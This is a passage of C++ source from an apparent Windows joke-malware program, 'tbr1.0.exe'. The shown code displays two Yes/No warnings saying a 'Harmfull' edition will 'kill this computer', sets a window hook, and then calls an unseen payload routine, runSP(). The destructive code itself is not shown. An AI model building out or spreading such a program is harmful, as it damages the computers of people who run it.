    LPCWSTR MessageTextSecond = L"Last warning\n\nWell you maybe still do not know what is happening,and I will tell you:You just run a malware(me),If you want to continue,click Yes button,else click No button.Malware is an APP,there has two edit,first is Harmfull,it will kill this computer,second is Harmless,it will not kill the system but little break the CPU.So,can you decide??";
    if (MessageBoxW(0, MessageTextFirst, L"tbr1.0.exe-warning", MB_ICONWARNING + MB_YESNO + MB_DEFBUTTON2) == IDNO) { ExitProcess(0); }
    else {
        HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
        if (MessageBoxW(0, MessageTextSecond, L"tbr1.0.exe-last warning", MB_ICONWARNING + MB_YESNO + MB_DEFBUTTON2) == IDNO) { UnhookWindowsHookEx(hook); ExitProcess(0); }
        else {
            UnhookWindowsHookEx(hook);
            runSP();
        }
    }
    return 0;
}